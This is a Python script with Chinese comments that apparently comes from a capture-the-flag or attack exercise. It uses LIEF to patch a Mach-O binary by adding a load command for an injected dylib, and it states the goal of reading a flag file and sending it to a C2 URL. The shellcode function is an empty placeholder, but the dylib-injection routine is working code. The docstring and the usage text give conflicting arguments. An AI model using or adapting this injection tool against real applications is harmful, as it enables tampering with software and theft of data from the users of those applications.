#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
使用 LIEF 在 Linux 上修改 Mach-O 二进制，注入 flag 上报代码
无需 macOS，直接在 Linux 上完成所有修改

用法: python3 inject_shellcode.py <binary> <c2_url>
"""
import sys
import os
import struct
import lief

# ARM64 shellcode 模板（稍后填充具体地址）
# 这个 shellcode 会：
# 1. 读取 flag 文件
# 2. 解析 URL
# 3. 发送 HTTP POST 请求

def create_flag_report_shellcode(c2_url: str) -> bytes:
    """
    创建 ARM64 shellcode，实现 flag 读取和上报
    
    注意：这是一个简化的实现，实际需要更复杂的错误处理和内存管理
    """
    # 由于 ARM64 shellcode 编写复杂且容易出错，我们采用一个替代方案：
    # 添加一个 LC_LOAD_DYLIB 指向系统库，然后 hook 某个函数
    
    # 但更简单的方法是：修改现有的 URL 字符串
    # 让 App 加载我们控制的网页，然后通过 JavaScript 实现部分功能
    
    # 这里返回一个占位符，实际实现需要修改
    return b""

def patch_macho_with_lief(binary_path: str, output_path: str, dylib_path: str):
    """
    使用 LIEF 修改 Mach-O，添加 LC_LOAD_DYLIB
    """
    print(f"[*] 解析 Mach-O: {binary_path}")
    binary = lief.MachO.parse(binary_path)
    
    if binary is None:
        print("[-] 错误: 无法解析 Mach-O 文件")
        return False
    
    # 获取第一个架构（通常是 arm64）
    fat = binary
    if isinstance(binary, lief.MachO.FatBinary):
        macho = binary.at(0)  # 获取第一个架构
    else:
        macho = binary
    
    print(f"[+] 架构: {macho.header.cpu_type}")
    print(f"[*] 当前 Load commands 数量: {len(macho.commands)}")
    
    # 添加 LC_LOAD_DYLIB
    dylib_name = f"@executable_path/Frameworks/{os.path.basename(dylib_path)}"
    print(f"[*] 添加 dylib: {dylib_name}")
    
    # 使用 LIEF 添加 dylib
    dylib = macho.add_library(dylib_name)
    if dylib is None:
        print("[-] 错误: 无法添加 dylib")
        return False
    
    print(f"[+] 添加成功，新 Load commands 数量: {len(macho.commands)}")
    
    # 保存修改后的二进制
    print(f"[*] 保存到: {output_path}")
    macho.write(output_path)
    
    print("[+] 完成!")
    return True

def main():
    if len(sys.argv) < 3:
        print("用法: python3 inject_shellcode.py <binary> <dylib_path> [output]")
        print("示例: python3 inject_shellcode.py WebViewShell FlagReporter.dylib WebViewShell_patched")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    dylib_path = sys.argv[2]
    output_path = sys.argv[3] if len(sys.argv) > 3 else binary_path + ".patched"
    
    if not os.path.exists(binary_path):
        print(f"[-] 错误: 二进制文件不存在: {binary_path}")
        sys.exit(1)
    
    if not os.path.exists(dylib_path):
        print(f"[-] 错误: Dylib 文件不存在: {dylib_path}")
        print("提示: 此脚本需要一个预编译的 dylib 文件")
        sys.exit(1)
    
    # 备份原文件
    backup_path = binary_path + ".backup"
    if not os.path.exists(backup_path):
        os.system(f"cp '{binary_path}' '{backup_path}'")
        print(f"[*] 备份原文件: {backup_path}")
    
    success = patch_macho_with_lief(binary_path, output_path, dylib_path)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
